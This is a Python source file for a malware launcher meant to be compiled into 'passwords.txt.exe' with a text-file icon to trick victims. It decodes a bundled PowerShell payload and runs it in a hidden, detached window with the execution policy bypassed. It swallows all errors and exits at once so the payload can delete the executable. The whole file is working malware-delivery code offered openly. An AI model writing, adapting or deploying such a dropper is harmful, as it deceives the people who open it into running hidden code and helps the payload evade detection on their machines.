#!/usr/bin/env python3
"""
Anytime Payload Launcher (PyInstaller-compatible)
This launcher will be compiled to passwords.txt.exe with text icon
Reads and executes the bundled PowerShell payload
"""

import subprocess
import sys
import base64
import os


def get_resource_path(relative_path):
    """Get absolute path to resource, works for dev and for PyInstaller"""
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except AttributeError:
        # Running in normal Python environment
        base_path = os.path.dirname(os.path.abspath(__file__))

    return os.path.join(base_path, relative_path)


def main():
    """Read PowerShell payload and execute it"""
    try:
        # Read the bundled payload.ps1 file
        payload_path = get_resource_path("payload.ps1")
        with open(payload_path, "r", encoding="utf-8") as f:
            payload_script = f.read()

        # Encode to UTF-16LE (PowerShell requirement)
        payload_bytes = payload_script.encode("utf-16le")

        # Base64 encode
        payload_base64 = base64.b64encode(payload_bytes).decode("ascii")

        # Execute PowerShell with hidden window (non-blocking)
        # Use Popen instead of run() so the .exe can exit immediately
        # This allows PowerShell to delete the .exe after it exits
        creation_flags = 0
        if sys.platform == "win32":
            # Windows-specific flags for detached, hidden process
            DETACHED_PROCESS = 0x00000008
            CREATE_NO_WINDOW = 0x08000000
            creation_flags = DETACHED_PROCESS | CREATE_NO_WINDOW

        subprocess.Popen(
            [
                "powershell.exe",
                "-WindowStyle",
                "Hidden",
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-NonInteractive",
                "-EncodedCommand",
                payload_base64,
            ],
            shell=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=creation_flags,
        )
    except Exception:
        # Silent failure
        pass

    # Exit immediately without waiting for PowerShell
    sys.exit(0)


if __name__ == "__main__":
    main()
